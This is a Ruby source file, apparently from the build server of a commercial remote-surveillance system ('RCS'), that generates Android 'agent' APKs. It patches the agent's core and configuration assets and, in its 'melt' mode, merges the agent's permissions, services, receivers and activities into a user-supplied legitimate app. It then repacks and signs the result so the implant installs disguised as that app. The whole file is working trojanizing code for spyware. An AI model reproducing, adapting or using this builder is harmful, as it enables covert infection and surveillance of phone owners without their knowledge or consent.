#
#  Agent creation for android
#

# from RCS::Common
require 'rcs-common/trace'

require 'xmlsimple'

module RCS
module DB

class BuildAndroid < Build

  def initialize
    super
    @platform = 'android'
  end

  def unpack
    super

    trace :debug, "Build: apktool extract: #{@tmpdir}/apk"

    apktool = path('apktool.jar')
    
    Dir[path('core.*.apk')].each do |d| 
      version = d.scan(/core.android.(.*).apk/).flatten.first

      if version == "melt" then
        #CrossPlatform.exec "java", "-jar #{apktool} if #{@tmpdir}/jelly.apk jelly" 
        CrossPlatform.exec "java", "-jar #{apktool} d #{d} #{@tmpdir}/apk.#{version}"
      else
        CrossPlatform.exec "java", "-jar #{apktool} d -s -r #{d}  #{@tmpdir}/apk.#{version}"
      end
      
      ["r.bin", "c.bin"].each do |asset|
        raise "unpack failed. needed asset #{asset} not found" unless File.exist?(path("apk.#{version}/assets/#{asset}"))
      end
      
    end
  end

  def patch(params)
    trace :debug, "Build: patching: #{params}"

    # enforce demo flag accordingly to the license
    # or raise if cannot build
    params['demo'] = LicenseManager.instance.can_build_platform :android, params['demo']

    Dir[path('core.*.apk')].each do |d| 
      version = d.scan(/core.android.(.*).apk/).flatten.first

      # add the file to be patched to the params
      # these params will be passed to the super
      params[:core] = "apk.#{version}/assets/r.bin"
      params[:config] = "apk.#{version}/assets/c.bin"
      
      # invoke the generic patch method with the new params
      super
      
      patch_file(:file => params[:core]) do |content|
      begin
        method = params['admin'] ? 'IrXCtyrrDXMJEvOU' : SecureRandom.random_bytes(16)
        content.binary_patch 'IrXCtyrrDXMJEvOU', method
      rescue
        raise "Working method marker not found"
      end
      end
    end
  end

  def melt(params)
    trace :debug, "Build: melting: #{params}"

    @appname = params['appname'] || 'install'
    @outputs = []
    
    # choose the correct melting mode
    melting_mode = :silent
    melting_mode = :melted if params['input']

    case melting_mode
      when :silent
        silent()
      when :melted
        # user-provided file to melt with
        melted(Config.instance.temp(params['input']))
    end

    trace :debug, "Build: melt output is: #{@outputs.inspect}"
    
    raise "Melt failed" if @outputs.empty?
  end

  def sign(params)
    trace :debug, "Build: signing with #{Config::CERT_DIR}/android.keystore"

    apks = @outputs
    @outputs = []

    apks.each do |d| 
      version = d.scan(/output.(.*).apk/).flatten.first

      apk = path(d)
      output = "#{@appname}.#{version}.apk"
      core = path(output)

      raise "Cannot find keystore" unless File.exist? Config.instance.cert('android.keystore')

      CrossPlatform.exec "jarsigner", "-keystore #{Config.instance.cert('android.keystore')} -storepass #{Config.instance.global['CERT_PASSWORD']} -keypass #{Config.instance.global['CERT_PASSWORD']} #{apk} ServiceCore"

      raise "jarsigner failed" unless File.exist? apk
      
      File.chmod(0755, path('zipalign')) if File.exist? path('zipalign')
      CrossPlatform.exec path('zipalign'), "-f 4 #{apk} #{core}" or raise("cannot align apk")

      FileUtils.rm_rf(apk)

      @outputs << output
    end
  end

  def pack(params)
    trace :debug, "Build: pack: #{params}"

    Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
      @outputs.each do |o|
        z.file.open(o, "wb") { |f| f.write File.open(path(o), 'rb') {|f| f.read} }
      end
    end

    # this is the only file we need to output after this point
    @outputs = ['output.zip']

  end

  def unique(core)
    Zip::ZipFile.open(core) do |z|
      z.each do |f|
        f_path = path(f.name)
        FileUtils.mkdir_p(File.dirname(f_path))

        # skip empty dirs
        next if File.directory?(f.name)

        z.extract(f, f_path) unless File.exist?(f_path)
      end
    end

    apktool = path('apktool.jar')

    Dir[path('core.*.apk')].each do |apk|
      version = apk.scan(/core.android.(.*).apk/).flatten.first

      CrossPlatform.exec "java", "-jar #{apktool} d -s -r #{apk} #{@tmpdir}/apk.#{version}"

      core_content = File.open(path("apk.#{version}/assets/r.bin"), "rb") { |f| f.read }
      add_magic(core_content)
      File.open(path("apk.#{version}/assets/r.bin"), "wb") { |f| f.write core_content }

      FileUtils.rm_rf apk

      CrossPlatform.exec "java", "-jar #{apktool} b #{@tmpdir}/apk.#{version} #{apk}", {add_path: @tmpdir}

      # update with the zip utility since rubyzip corrupts zip file made by winzip or 7zip
      CrossPlatform.exec "zip", "-j -u #{core} #{apk}"
      FileUtils.rm_rf Config.instance.temp('apk')
    end
  end
  
  private
  
  def silent
    trace :debug, "Build: silent installer"

    apktool = path('apktool.jar')
    File.chmod(0755, path('aapt')) if File.exist? path('aapt')
    
    Dir[path('core.*.apk')].each do |d| 
      version = d.scan(/core.android.(.*).apk/).flatten.first
      next if version == "melt"
      
      apk = path("output.#{version}.apk")

      CrossPlatform.exec "java", "-jar #{apktool} b #{@tmpdir}/apk.#{version} #{apk}", {add_path: @tmpdir}

      raise "Silent Melt: pack failed." unless File.exist?(apk)
      
      @outputs << "output.#{version}.apk"
    end
  end

  def melted(input)    
    trace :debug, "Build: melted installer"

    apktool = path('apktool.jar')
    
    FileUtils.mv input, path('input')
    rcsdir = "#{@tmpdir}/apk.melt"
    pkgdir = "#{@tmpdir}/melt_input"

    # unpack the dropper application
    CrossPlatform.exec "java", "-jar #{apktool} d #{path('input')} #{pkgdir}"
    FileUtils.cp path('AndroidManifest.xml'), rcsdir

    # load and mix the manifest and resources
    newmanifest = parse_manifest(rcsdir, pkgdir)
    style, color = parse_style(rcsdir, pkgdir)

    # merge the directories
    merge(rcsdir, pkgdir)

    # fix the xml headers
    patch_xml("#{rcsdir}/AndroidManifest.xml", newmanifest)
    patch_xml("#{rcsdir}/res/values/styles.xml", style)
    patch_xml("#{rcsdir}/res/values/colors.xml", color)
    
    # fix textAllCaps
    patch_resources(rcsdir)

    # repack the final application
    apk = path("output.m.apk")
    CrossPlatform.exec "java", "-jar #{apktool} b #{rcsdir} #{apk}", {add_path: @tmpdir}
      
    @outputs = ["output.m.apk"] if File.exist?(apk)
  end
  
  def parse_manifest(rcsdir, pkgdir)
    trace :debug, "parse manifest #{rcsdir}, #{pkgdir}"

    xmlrcs = XmlSimple.xml_in("#{rcsdir}/AndroidManifest.xml", {'KeepRoot' => true})
    xmlpkg = XmlSimple.xml_in("#{pkgdir}/AndroidManifest.xml", {'KeepRoot' => true})

    mix_manifest_permission(xmlpkg, xmlrcs, "uses-permission")
    mix_manifest_application(xmlpkg, xmlrcs, "receiver")
    mix_manifest_application(xmlpkg, xmlrcs, "activity")
    mix_manifest_application(xmlpkg, xmlrcs, "service")

    return XmlSimple.xml_out(xmlpkg, {'KeepRoot' => true})

  rescue Exception => e
    trace :error, "Cannot parse Manifest: #{e.message}"
    raise "Cannot parse Manifest: #{e.message}"
  end

  def mix_manifest_permission(xmlpkg, xmlrcs, key)
    tmppkg = xmlpkg["manifest"][0]
    tmprcs = xmlrcs["manifest"][0]

    if tmppkg.has_key? key
      tmppkg[key] += tmprcs[key]
    else
      tmppkg[key] = tmprcs[key]
    end
  end
  
  def mix_manifest_application(xmlpkg, xmlrcs, key)
    tmppkg = xmlpkg["manifest"][0]["application"][0]
    tmprcs = xmlrcs["manifest"][0]["application"][0]

    if tmppkg.has_key? key
      tmppkg[key] += tmprcs[key]
    else
      tmppkg[key] = tmprcs[key]
    end
  end
  
  def parse_style(rcsdir, pkgdir)
    style = mix_manifest_resources("#{pkgdir}/res/values/styles.xml", "#{rcsdir}/res/values/styles.xml", "style")
    color = mix_manifest_resources("#{pkgdir}/res/values/colors.xml", "#{rcsdir}/res/values/colors.xml", "color")
    
    manifest_style = XmlSimple.xml_out(style, {'KeepRoot' => true})
    manifest_col =  XmlSimple.xml_out(color, {'KeepRoot' => true})

    return manifest_style, manifest_col
  end
  
  def patch_xml(file, xml)
    xml.insert(0, "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n")
    File.open(file, "w") {|f| f.write xml}
  end
  
  def patch_resources(rcsdir)
    matches = ['android:textAllCaps="true"', '<item name="android:borderTop">true</item>']
    #matches = ['android:textAllCaps="true"']

    Dir["#{rcsdir}/res/**/*.xml"].each do |filename|
      found = false
      content = ""

      File.open(filename, 'r').each do |line|
        matches.each do |match|
        if line.include? match
          found = true
          line = line.sub(match, '')
        end
      end
      
      content+=line
    end
    
    trace :debug, "melt resource patched: #{filename}" if found  
    File.open("#{filename}", 'w') { |out_file| out_file.write content } if found

    end
  end

  
  def mix_manifest_resources(from, to, key)
    xt = XmlSimple.xml_in to, {'KeepRoot' => true}

    if File.exists? from
      xml = XmlSimple.xml_in from, {'KeepRoot' => true}
      xml["resources"][0][key] += xt["resources"][0][key]
    else
      xml = xt
    end

    return xml
  end

  def merge(rcsdir, pkgdir)
    FileUtils.rm "#{rcsdir}/res/layout/main.xml"
    FileUtils.cp_r "#{pkgdir}/.", "#{rcsdir}"
  end
  
end

end #DB::
end #RCS::
